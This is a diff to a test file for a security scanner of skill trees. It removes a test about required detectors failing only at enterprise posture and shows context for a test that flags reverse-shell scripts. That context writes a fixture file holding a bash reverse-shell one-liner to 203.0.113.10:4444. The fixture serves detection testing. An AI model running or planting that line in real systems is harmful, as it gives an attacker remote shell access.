@@ -681,48 +681,6 @@ describe("scanTrustTree", () => {
     );
   });
 
-  it("fails unsupported required detectors only at enterprise posture", async () => {
-    skill("skills/clean", "# Clean\n");
-    const missingDocker = fakeRunner((argv) =>
-      argv[0] === "docker" ? { code: 127, stderr: "not found", spawnError: true } : undefined,
-    );
-
-    const vibe = await scanTrustTreeWithAnalyzers(dir, {
-      env: {},
-      platform: "linux",
-      posture: "vibe",
-      requiredDetectors: ["semgrep"],
-      run: missingDocker,
-    });
-    expect(vibe.checks).toEqual(
-      expect.arrayContaining([
-        expect.objectContaining({
-          verdict: "skip",
-          code: "trust.detector-unavailable",
-          detail: expect.stringContaining("semgrep"),
-        }),
-      ]),
-    );
-    expect(vibe.checks.some((check) => check.verdict === "fail")).toBe(false);
-
-    const enterprise = await scanTrustTreeWithAnalyzers(dir, {
-      env: {},
-      platform: "linux",
-      posture: "enterprise",
-      requiredDetectors: ["semgrep"],
-      run: missingDocker,
-    });
-    expect(enterprise.checks).toEqual(
-      expect.arrayContaining([
-        expect.objectContaining({
-          verdict: "fail",
-          code: "trust.detector-unavailable",
-          detail: expect.stringContaining("required detector semgrep"),
-        }),
-      ]),
-    );
-  });
-
   it("flags native reverse-shell script shapes as malicious code", async () => {
     skill("skills/clean", "# Clean\n");
     write("scripts/pwn.sh", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
